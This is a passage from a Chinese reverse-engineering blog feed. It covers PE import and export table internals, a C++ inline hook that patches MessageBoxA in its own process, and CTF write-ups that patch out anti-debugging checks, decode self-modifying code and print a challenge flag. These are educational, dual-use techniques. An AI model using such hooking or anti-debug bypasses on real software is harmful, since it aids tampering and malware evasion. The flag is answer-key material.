000006C4</span></span><br></pre></td></tr></table></figure><p><strong>1.库名称Name</strong><br>Name是一个字符串指针，它指向导入函数的库文件名称，我们去6EAC看看。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210306224337.png" alt="20200127193425644"></p><p><strong>2.INT（NULL结尾）</strong><br>INT是一个包含导入函数信息的结构体指针数组，也就是说只有获得了这些信息，才能在加载在进程中的库文件的库中求得相应函数起始地址。INT数组成员全是地址（RVA），以NULL结尾，每个地址分别指向一个IMAGE_IMPORT_BY_NAME结构体，说的那么高大上，其实就是指向函数名称。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210306224406.png" alt="20200127193509419"></p><p>我们跟踪一下RVA 7A7A—&gt;RAW 6E7A.</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210306224422.png" alt="20200127193545642"></p><p>我们跟踪一下RVA 7A5E—&gt;RAW 6E5E</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210306224437.png" alt="20200127193612132"></p><p><strong>3.FirstThunk(IAT)</strong></p><p>FirstThunk也就是IAT（Import Address Table）数组，以NULL结尾，这个数组就是对应的库文件的数组，里面的成员为地址与INT数组的函数名字对应，<br>上面的IAT的RVA是12C4，RAW为06C4,我们跟踪看看。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210306224503.png" alt="20200127193705470"></p><p>也就是说，comdlg32.dll库文件里面的PageSetupDlgW函数的地址为0x76344906，FindTextW函数地址为0x763385CE。</p><p>现在我们来总结一下流程：可选头里面的DataDirectory[1]结构体里面的第一个元素（4个字节一个元素）就是指向IAMGE_IMPORT_DESCRITPTOR数组的RVA，计算得到IID数组的偏移RAW，IID数组无特定大小，5个成员组成一个结构体，每个成员4个字节，都是RVA。结构体一共5✖4=20字节，导入多少函数就有多少这样的结构体，反正最后以NULL结尾。结构体里面的5个成员中，第2个和第3个没啥用，重点是第1个，第4和第5个成员，他们分别是OriginalFirstThunk(INT),Name和FirstThunk(IAT)的RVA，计算得到分别的RAW。<br>Name：查看导入库文件的名字，可以看到字符串。<br>INT：查看该库文件的函数信息，4个字节组成一个单位，表示函数名字的RVA，无特定大小，反正最后以NULL结尾。计算RAW，可以在得到的RAW看到函数名字。<br>IAT：保存着库文件函数的地址，是函数的地址，不是函数名字，注意不要和上面INT搞混，也是以NULL结尾，所指向的地址和INT里面的函数一一对应。</p><h2 id="EAT-Export-Address-Table"><a href="#EAT-Export-Address-Table" class="headerlink" title="EAT(Export Address Table)"></a>EAT(Export Address Table)</h2><p>有上面的IAT，EXE文件来导入函数，肯定就有DLL文件用EAT来导出函数让其他进程使用。EAT也是Windows OS的核心机制，它使得不同的应用程序可以调用库文件中提供的函数。和IAT一样，PE文件可选头里面的也有一个IMAGE_EXPORT_DIRECTORY结构体，每个成员都为RVA。它是数据目录表（DateDirectory）的第一个元素DateDirectory[0]。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">RVA of EXPORT Directory</span><br><span class="line">size of EXPORT Directory</span><br><span class="line">RVA of IMPORT Directory</span><br><span class="line">size of IMPORT Directory</span><br><span class="line">RVA of RESOURCE Directory</span><br><span class="line">size of RESOURCE Directory</span><br></pre></td></tr></table></figure><h3 id="IMAGE-EXPORT-DIRECTORY"><a href="#IMAGE-EXPORT-DIRECTORY" class="headerlink" title="IMAGE_EXPORT_DIRECTORY"></a>IMAGE_EXPORT_DIRECTORY</h3><p>IAMGE_EXPORT_DIRECTORY结构体如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IAMGE_EXPORT_DIRECTORY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DWORD Characteristics;          <span class="comment">//未使用，总为0</span></span><br><span class="line">    DWORD TimeDateStamp;            <span class="comment">//创建输出表创建时间(GMT时间)</span></span><br><span class="line">    WORD MajorVersion;              <span class="comment">//主版本号,一般为0</span></span><br><span class="line">    WORD MinorVersion;              <span class="comment">//次版本号,一般为0</span></span><br><span class="line">    DWORD Name;                     <span class="comment">//模块的真实名称</span></span><br><span class="line">    DWORD Base;                     <span class="comment">//基数，加上序数就是函数数组的索引值</span></span><br><span class="line">    DWORD NumberOfFunctions;        <span class="comment">//AddressOfFunctions阵列中的元素个数</span></span><br><span class="line">    DWORD NumberOfNames;            <span class="comment">//AddressOfNameS阵列中的元素个数</span></span><br><span class="line">    DWORD AddressOfFunctions;       <span class="comment">//指向函数地址数组</span></span><br><span class="line">    DWORD AddressOfNames;           <span class="comment">//函数名字的指针地址</span></span><br><span class="line">    DWORD AddressOfNameOrdinals;    <span class="comment">//指向输出序号数组</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>看到如此众多的成员让人头皮发麻，但是和IAT一样，没必要掌握所有。下面列出重要成员：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">NumberOfFunctionsAddressOfFunctions阵列中的元素个数</span><br><span class="line">NumberOfNamesAddressOfNameS阵列中的元素个数</span><br><span class="line">AddressOfFunctions指向函数地址数组</span><br><span class="line">AddressOfNames函数名字的指针地址</span><br><span class="line">AddressOfNameOrdinals指向输出序号数组</span><br></pre></td></tr></table></figure><p>操作系统通过GetProcAddress()函数获得库中函数的地址，该API用EAT来获取API地址，GetProcAddress()函数的工作原理就显得尤为重要，也就是说，搞懂了其工作原理，就搞懂了EAT。接下来我们看看简单的流程：</p><p>1.利用AddressOfNames成员转到函数名称数组。<br>2.函数名称数组存储着字符串地址，通过挨个比较字符串，查找指定的函数名称。<br>3.利用AddressOfNameOrdinals成员转到orinal（索引）数组。<br>4.在ordinal数组中通过index查找对应的orinal值。<br>5.利用AddressOfFunctions成员转到函数地址数组EAT。<br>6.在函数地址数组中将orinal作为索引获得指定函数的起始地址<br>到这里我已经晕了，云里雾里的，接下来我们用kernel32.dll看一下。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210306224638.png" alt="20200127194222963"></p><p>IAMGE_EXPORT_DIRECTORY的RAW:262C-1000+400=1A2C,我们跟去1A2C看看.</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210306224712.png" alt="20200127194311292"></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">成员   值RAW</span><br><span class="line"> Characteristics;            <span class="number">00000000</span> -</span><br><span class="line"> TimeDateStamp;              <span class="number">48025B</span>E1 -</span><br><span class="line"> MajorVersion;                 <span class="number">0000</span> -</span><br><span class="line"> MinorVersion;                 <span class="number">0000</span> -</span><br><span class="line"> Name;                       <span class="number">00004B</span>8E<span class="number">3F</span>8E</span><br><span class="line"> Base;                       <span class="number">00000001</span> -</span><br><span class="line"> NumberOfFunctions;          <span class="number">000003B</span>9 -</span><br><span class="line"> NumberOfNames;              <span class="number">000003B</span>9  -</span><br><span class="line"> AddressOfFunctions;         <span class="number">00002654</span><span class="number">1</span>A54</span><br><span class="line"> AddressOfNames;             <span class="number">00003538</span><span class="number">2938</span></span><br><span class="line"> AddressOfNameOrdinals;     <span class="number">0000441</span>C<span class="number">381</span>C</span><br></pre></td></tr></table></figure><p>然后按照之前的流程看看。<br>1.函数名称数组<br>比如我们要查找函数AddAtomA，AddressOfNames的RAW为2938，使用winhex查看。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210306224747.png" alt="20200127194356834"></p><p>此处为4字节RVA组成的数组，数组元素个数为NumberOfNames(3BA).逐一跟随所有RVA的值可以发现函数名称字符串。<br>当我们逐一跟随到第二个时，就会发现我们的目标函数字符串，因为是数组的第二个元素，该函数的数组索引index为1<br>RVA:4BAA—&gt;RAW:3FAA</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210306224804.png" alt="20200127194430917"></p><p>2.Ordinal数组<br>Ordinal数组中各个元素大小为2个字节，AddressOfNameOrdinals 成员的值为RVA：0000441C—–&gt;RAW:381C</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210306224825.png" alt="20200127194451342"></p><p>利用上面求到的index值作为数组下标带入Ordinal数组得到索引值ordinal为0001.</p><p>3.函数地址数组（EAT）<br>现在我们要查找AddAtomA函数的实际地址，AddressOfFunctions——&gt;RVA:00002654—–&gt;RAW:1A54,这就是EXPORT数组的地址（各个元素大小为4个字节，里面保存着各个函数地址的RVA）将求得的ordinal作为数组下标带入进去，得到AddAtomA函数的RVA:35505—&gt;RAW:</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210306224855.png" alt="20200127194615187"></p><p>kernel32.dll的ImageBase为7C7C0000。因此AddAtomA函数的实际地址VA=7C800000+35505=7C835505‬<br>可以用OD验证一下。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210306224912.png" alt="20200127194639240"></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">NumberOfFunctionsAddressOfFunctions阵列中的元素个数</span><br><span class="line">NumberOfNamesAddressOfNameS阵列中的元素个数</span><br><span class="line">AddressOfFunctions指向函数地址数组</span><br><span class="line">AddressOfNames函数名字的指针地址</span><br><span class="line">AddressOfNameOrdinals指向输出序号数组</span><br></pre></td></tr></table></figure><p>现在我们来总结一下流程：可选头里面的DataDirectory[0]结构体里面的第一个元素（4个字节一个元素）就是指向IAMGE_EXPORT_DESCRITPTOR结构体的RVA，计算得到数组的偏移RAWIAMGE_EXPORT_DESCRITPTOR结构体一共占40个字节，最后五个成员十分重要。AddressOfNames是由每个元素4字节的RVA组成的数组，数组元素个数为NumberOfNames，逐一跟随所有RVA的值发现函数名称字符串。并以此数组下标得到index的值，AddressOfNameOrdinals成员就是由每个元素2个字节组成的Ordinal数组，将index作为下标得到Ordinal，AddressOfFunctions成员就是由函数的RVA组成的数组，将Ordinal作为下标得到函数的偏移值，加上基址便得到函数实际地址。</p><p>看到这里，已经初步了解了PE文件格式，对PE文件结构也有了个大体印象。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;写点笔记做点记录，一些PE文件的粗浅认识。&lt;/p&gt;
&lt;h1 id=&quot;PE文件格式图总览&quot;&gt;&lt;a href=&quot;#PE文件格式图总览&quot; class=&quot;headerlink&quot; title=&quot;PE文件格式图总览&quot;&gt;&lt;/a&gt;PE文件格式图总览&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;htt</summary>
      
    
    
    
    <category term="Win" scheme="http://0xnope.top/categories/Win/"/>
    
    
    <category term="C++" scheme="http://0xnope.top/tags/C/"/>
    
    <category term="Windows" scheme="http://0xnope.top/tags/Windows/"/>
    
    <category term="PE" scheme="http://0xnope.top/tags/PE/"/>
    
  </entry>
  
  <entry>
    <title>inline_hook</title>
    <link href="http://0xnope.top/2021/03/06/inline-hook/"/>
    <id>http://0xnope.top/2021/03/06/inline-hook/</id>
    <published>2021-03-06T13:39:39.000Z</published>
    <updated>2021-03-14T14:15:26.248Z</updated>
    
    <content type="html"><![CDATA[<p>inline hook是一种通过修改机器码来实现hook的技术。</p><p>我们知道，任何程序，不管多大，不管是面向对象编程还是面向过程编程，其底层都是由一条一条的指令流组成的，我们改变指令的执行流程，在call函数执行之前将其跳转到我们的函数，执行完我们的函数再跳转回call函数的下一条指令，这样就将其hook了。也就是说，我们要hook一个函数，就在函数开头的地方改变执行流程。</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//inline hook 实际上就是指 通过改变目标函数头部的代码来使改变后的代码跳转至我们自己设置的一个函数里，产生hook.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个与MessageBoxA类型一致的函数指针。</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(WINAPI* MessageBox_type)</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span></span>;</span><br><span class="line">MessageBox_type RealMessageBox = MessageBoxA;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义的MessageBox，每调用MessageBox都要跳到myMessageBox来处理</span></span><br><span class="line">_declspec(naked) <span class="function"><span class="keyword">void</span> WINAPI <span class="title">myMessageBox</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        PUSH ebp</span><br><span class="line">        mov ebp, esp    <span class="comment">//平衡栈顶</span></span><br><span class="line">        push esi    <span class="comment">//由于编译后的代码会有cmp esi esp来比较堆栈。所以这里在执行功能代码前保存一下esi.</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在此加入HOOK之后要执行的功能代码。</span></span><br><span class="line">    <span class="comment">//此处举例打印出系统API：MessageBox的参数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hwnd:%d  lpText:%s  lpCaption:%s  uType:%d  \n&quot;</span>, hWnd, lpText, lpCaption, uType); <span class="comment">//由于myMessageBox是直接在API MessageBoxA的头部跳转过来的，MessageBoxA的栈空间没被改变，所以其参数可被myMessageBox直接使用。</span></span><br><span class="line"></span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        pop esi    <span class="comment">//恢复esi.</span></span><br><span class="line">        mov ebx, RealMessageBox</span><br><span class="line">        add ebx, <span class="number">5</span>    <span class="comment">//JMP dword ptr 占5个字节(远地址跳转)如：E9 90604000; RealMessageBox为API MessageBoxA的地址，所以此处为JMP dword ptr [MessageBoxA的硬编码地址+5]</span></span><br><span class="line">        jmp ebx        <span class="comment">//跳回到API MessageBoxA的真实地址。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(1) <span class="comment">//规定数据对齐系数的最大值为1个字节。</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">JMPCODE</span>    //用于覆盖<span class="title">API</span> <span class="title">MessageBoxA</span>的头部的5个字节。</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    BYTE jmp;</span><br><span class="line">    DWORD addr; <span class="comment">//跳转到钩子函数myMessageBox。</span></span><br><span class="line">&#125;JMPCODE, * PJMPCODE;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">HookMessageBoxA</span><span class="params">()</span> <span class="comment">//通过修改API MessageBoxA 函数入口来进行Inline HOOK</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    JMPCODE jcode;</span><br><span class="line">    jcode.jmp = <span class="number">0xe9</span>;<span class="comment">//jmp的硬编码</span></span><br><span class="line">    jcode.addr = (DWORD)myMessageBox - (DWORD)RealMessageBox - <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    ::WriteProcessMemory(GetCurrentProcess(), MessageBoxA, &amp;jcode, <span class="keyword">sizeof</span>(JMPCODE), <span class="literal">NULL</span>);<span class="comment">//修改API MessageBoxA前5个字节实现跳转到自定义的钩子函数myMessageBox。</span></span><br><span class="line">    <span class="comment">//GetCurrentProcess() 获取当前进程句柄（内存基址）。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HookMessageBoxA();  <span class="comment">//hook操作</span></span><br><span class="line">    ::MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;InlineHOOK Test.&quot;</span>, <span class="string">&quot;Title here&quot;</span>, MB_OK); <span class="comment">//直接加双冒号::表示使用全局函数，当全局函数没有该函数时即指API函数。</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;inline hook是一种通过修改机器码来实现hook的技术。&lt;/p&gt;
&lt;p&gt;我们知道，任何程序，不管多大，不管是面向对象编程还是面向过程编程，其底层都是由一条一条的指令流组成的，我们改变指令的执行流程，在call函数执行之前将其跳转到我们的函数，执行完我们的函数再跳转回</summary>
      
    
    
    
    <category term="Reverse" scheme="http://0xnope.top/categories/Reverse/"/>
    
    
    <category term="C++" scheme="http://0xnope.top/tags/C/"/>
    
    <category term="Hook" scheme="http://0xnope.top/tags/Hook/"/>
    
    <category term="ASM" scheme="http://0xnope.top/tags/ASM/"/>
    
  </entry>
  
  <entry>
    <title>Buuctf_reverse</title>
    <link href="http://0xnope.top/2021/03/03/Buuctf-reverse/"/>
    <id>http://0xnope.top/2021/03/03/Buuctf-reverse/</id>
    <published>2021-03-03T14:58:40.000Z</published>
    <updated>2021-04-21T01:55:03.054Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DDCTF2018-探寻逝去的Atlantis文明"><a href="#DDCTF2018-探寻逝去的Atlantis文明" class="headerlink" title="[DDCTF2018]探寻逝去的Atlantis文明"></a>[DDCTF2018]探寻逝去的Atlantis文明</h1><h2 id="关键词：反调试"><a href="#关键词：反调试" class="headerlink" title="关键词：反调试"></a>关键词：反调试</h2><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>这个题有几个地方用到了不同的反调试手段（ZWSetInformationThread，IsDebuggerPresent，hook：0xcc-&gt;0xc3），难度中规中矩，加密解密为base64，异或替换。</p><p>环境：Windows XP SP2、IDA7.5、x32dbg、exeinfope</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>首先拿到文件，exeinfope查壳，无壳32位文件。载入IDA查看：</p><p>有两个TLS回调函数，分别为<code>TlsCallback_0</code>和<code>TlsCallback_1</code>，TLS回调函数先于main()函数执行。</p><h3 id="TlsCallback-0"><a href="#TlsCallback-0" class="headerlink" title="TlsCallback_0"></a>TlsCallback_0</h3><p>先来看TlsCallback_0回调函数：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210420215236.png" alt="[DDCTF2018]探寻逝去的Atlantis文明001"></p><p><code>sub_402B30</code>函数当中调用<code>ZwSetInformationThread</code>设置线程基础信息，其中参数17是<code>ThreadHideFromDebugger</code>用于反调试，这是第1个反调试函数。可以直接<code>nop</code>填充<code>sub_402B30</code>函数爆破。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210420215457.png" alt="[DDCTF2018]探寻逝去的Atlantis文明002"></p><p>生成一个数组<code>off_440530</code>用于下面存储五个API的地址。</p><p>接着<code>sub_4028F0</code>函数将五个API的地址存到上面开辟的数组当中。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210420215845.png" alt="[DDCTF2018]探寻逝去的Atlantis文明003"></p><p>紧接着一个<code>IsDebuggerPresent</code>反调试函数判断当前是否被调试，如果是，eax返回1，否则返回0。这是第2个反调试函数。</p><p>所以直接将e返回值eax的值改成0即可跳过。</p><p>如果<code>IsDebuggerPresent</code>判断当前进程正在被调试，<code>ExitProcess</code>退出当前进程。</p><h3 id="TlsCallback-1"><a href="#TlsCallback-1" class="headerlink" title="TlsCallback_1"></a>TlsCallback_1</h3><p><code>TlsCallback_1</code>函数很简单，就是弹个MessageBoxA。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210420222340.png" alt="[DDCTF2018]探寻逝去的Atlantis文明004"></p><h3 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h3><p>紧接着来到main函数，上面三个函数很复杂，涉及到一些加密解密混淆，先不用关心这三个函数。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210420223154.png" alt="[DDCTF2018]探寻逝去的Atlantis文明005"></p><p><code>sub_403180()</code>是个Hook，这是第3个反调试函数。</p><p>这个Hook将<code>0xCC（INT3）</code>机器码修改为<code>0xC3（ret）</code>导致调试器捕捉不到断点，令程序崩溃，可以直接nop掉，不影响。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210420230017.png" alt="[DDCTF2018]探寻逝去的Atlantis文明006"></p><p>既然上面的<code>sub_403180()</code>只是个Hook，分析整个main函数的逻辑可知，下面的<code>sub_403010</code>肯定是关键函数。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210420230130.png" alt="[DDCTF2018]探寻逝去的Atlantis文明007"></p><p>由于这个函数当中涉及很多动态加密解密，函数指针，静态分析根本看不出个所以然，必须进行动态调试。</p><p>上面的注释内容也是经过动态调试得出的结论，所以我们下面进行动态调试，重点调试分析这个<code>sub_403010</code>函数。</p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>在WindowsXP SP3中，我们将文件拖入x32dbg：ctrl+f9直接来到<code>Tlscallback_0</code>函数：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210421084931.png" alt="[DDCTF2018]探寻逝去的Atlantis文明008"></p><p>可以看到两个TlsCallback回调函数和之前静态分析出来的<code>ZwSetInformationThread</code>API和<code>IsDebuggerPresent</code>API,前者直接nop，后者将eax的值改位0（52的OD自动过了<code>IsDebuggerPresent</code>）。patch过后直接f9来到下面<code>__tmainCTRStartup</code>，该函数是系统对main函数的调用。</p><p><img src="C:\Users\thh\Pictures\ctf\BUUCTF[DDCTF2018]探寻逝去的Atlantis文明[DDCTF2018]探寻逝去的Atlantis文明009.png" alt="[DDCTF2018]探寻逝去的Atlantis文明009"></p><h3 id="main-1"><a href="#main-1" class="headerlink" title="main()"></a>main()</h3><p>两次f9直接来到main函数的入口：</p><p>结合静态分析，我们可以很快找到之前分析的一些复杂函数、Hook函数和关键函数，复杂函数不用进入管，Hook函数可以直接nop掉，f7直接进入关键函数。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210421085759.png" alt="[DDCTF2018]探寻逝去的Atlantis文明011"></p><h3 id="change-byte-amp-amp-check"><a href="#change-byte-amp-amp-check" class="headerlink" title="change_byte&amp;&amp;check"></a>change_byte&amp;&amp;check</h3><p>在关键函数<code>sub_403180</code>当中，我们来到下面代码区域：</p><p><code>push 0</code>指令和<code>push 1</code>指令可以帮助我们很快定位函数区域。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210421091717.png" alt="[DDCTF2018]探寻逝去的Atlantis文明012"></p><p>我们首先来看<code>push 0; call eax</code>下面这个函数，之前我们说到，这个函数作用是输出和输入，我们f7到其中，通过单步调试，可以看到输出和输入。如果进入<code>10001410</code>我们还可以看到其他的字符串。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210421091712.png" alt="[DDCTF2018]探寻逝去的Atlantis文明013"></p><p>我们再来看<code>call dword ptr ss:[esp + 30]  </code>这个函数，通过单步调试，在其中我们可以分析出<code>call 10001000</code>是将输入的字符串base64加密，然后x32dbg在下面显示了<code>GlobalAddAtomA</code>字符串，该API的作用是将字符串添加到全局原子表，可以直接f8步过，下面还有一些无关紧要的函数。我们直接ctrl+f9退出当前函数。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210421091705.png" alt="[DDCTF2018]探寻逝去的Atlantis文明014"></p><p>再来看<code>call ecx</code>这个函数，这个函数就是关键函数当中的关键函数了。进入该函数：</p><p>首先引人注目的一个字符串，并且下面还对这个字符串取出字符的操作。下面那个函数是引用input指针做一些释放工作。再下面几个函数不关键，直接f8步过。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210421091658.png" alt="[DDCTF2018]探寻逝去的Atlantis文明015"></p><p>此段区域是对上面字符串的一些操作，但是调试分析过后可以发现，取出单独字符串过后就没有操作了，这应该就是简单的混淆。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210421091650.png" alt="[DDCTF2018]探寻逝去的Atlantis文明016"></p><p>下面便是关键区域了：</p><p>上半部分是对输入字符串base64过后的字符串取用于下面异或替换。</p><p><code>BE0104</code>函数就是对base64字符串和某处的一些字符进行按位异或。</p><p><code>BE04A7</code>函数就是check函数，将一段固定表当中的字符串和经过操作过后的input字符串进行比对。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210421092015.png" alt="[DDCTF2018]探寻逝去的Atlantis文明017"></p><p>进入<code>BE04A7</code>函数：</p><p>可以看到这就是一段实现字符串check功能的函数。汇编指令<code>repe cmpsb</code>是将esi指向的字符串和edi指向的字符串进行按位比对。</p><p>esi指向异或过后的字符串（栈当中12F9C0），edi指向那个固定字符串（栈当中12F910）。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210421093102.png" alt="[DDCTF2018]探寻逝去的Atlantis文明018"></p><h2 id="get-flag"><a href="#get-flag" class="headerlink" title="get flag"></a>get flag</h2><p>于是我们有一个思路：</p><p>将固定表中的内容dump出来，重新运行到上面异或函数，将当中操作的字符串改成dump出来的固定表字符串，这样我们就得到了应该输入字符串base64加密过后的字符串，再base64解密过后得到我们应该输入的字符串，即flag。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210421093318.png" alt="[DDCTF2018]探寻逝去的Atlantis文明019"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210421093238.png" alt="[DDCTF2018]探寻逝去的Atlantis文明020"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210421093248.png" alt="[DDCTF2018]探寻逝去的Atlantis文明021"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">草稿：</span><br><span class="line">table：</span><br><span class="line">0012F910  65F49BCA  </span><br><span class="line">0012F914  0C70CFC4  </span><br><span class="line">0012F918  5CBB544D  </span><br><span class="line">0012F91C  B70C0603  返回到 B70C0603 自 AA0C18D8</span><br><span class="line">0012F920  5470A7CC  </span><br><span class="line">0012F924  17E7C572  </span><br><span class="line"></span><br><span class="line">将 table 异或替换过后得到我们应该输入值的base64过后的值：</span><br><span class="line">0012F9C0  44524552  </span><br><span class="line">0012F9C4  375A4556  </span><br><span class="line">0012F9C8  316C4762  </span><br><span class="line">0012F9CC  B70C0603  返回到 B70C0603 自 AA0C18D8</span><br><span class="line">0012F9D0  5470A7CC  </span><br><span class="line">0012F9D4  17E7C572</span><br><span class="line"></span><br><span class="line">0012F930  0012F9C0  &quot;RERDVEZ7bGl1bWF5XzIwMTh9&quot;</span><br><span class="line"></span><br><span class="line">将其解base64得到输入的值，也就是flag，但是注意大小端序</span><br></pre></td></tr></table></figure><h1 id="GWCTF-2019-re3"><a href="#GWCTF-2019-re3" class="headerlink" title="[GWCTF 2019]re3"></a>[GWCTF 2019]re3</h1><h2 id="关键词：IDC-AES-MD5-SMC"><a href="#关键词：IDC-AES-MD5-SMC" class="headerlink" title="关键词：IDC AES MD5 SMC"></a>关键词：IDC AES MD5 SMC</h2><p>查看文件基本信息：<img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210303230417.png" alt="[GWCTF 2019]re3001"></p><h2 id="去除混淆"><a href="#去除混淆" class="headerlink" title="去除混淆"></a>去除混淆</h2><h3 id="恢复sub-40207B-函数："><a href="#恢复sub-40207B-函数：" class="headerlink" title="恢复sub_40207B()函数："></a>恢复sub_40207B()函数：</h3><p>拖入ida，main函数如下：<img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210303230514.png" alt="[GWCTF 2019]re3002"></p><p>可以看到，sub_402219被当作数据进行异或，然后被当作函数被调用，也就是说异或完后，这个函数才是真正的函数。</p><p>这就是SMC(Self-Modifying Code)代码自修改<img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210303230552.png" alt="[GWCTF 2019]re3003"></p><p>选中地址402219按“D键”先将其转换为Data，然后用idc脚本（File-&gt;Script command-&gt;idc）将其异或回来：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span>  <span class="meta-string">&lt;idc.idc&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> addr = <span class="number">0x402219</span>;</span><br><span class="line">    <span class="keyword">auto</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">223</span>; ++i)&#123;</span><br><span class="line">        PatchByte(addr+i,Byte(addr+i)^<span class="number">0x99</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210303230738.png" alt="[GWCTF 2019]re3005"></p><p>选中数据，右键分析选中区域，force强制执行，按P键重构成函数。</p><h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><h3 id="sub-402219-函数"><a href="#sub-402219-函数" class="headerlink" title="sub_402219()函数"></a>sub_402219()函数</h3><h4 id="AES算法"><a href="#AES算法" class="headerlink" title="AES算法"></a>AES算法</h4><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210303230915.png" alt="[GWCTF 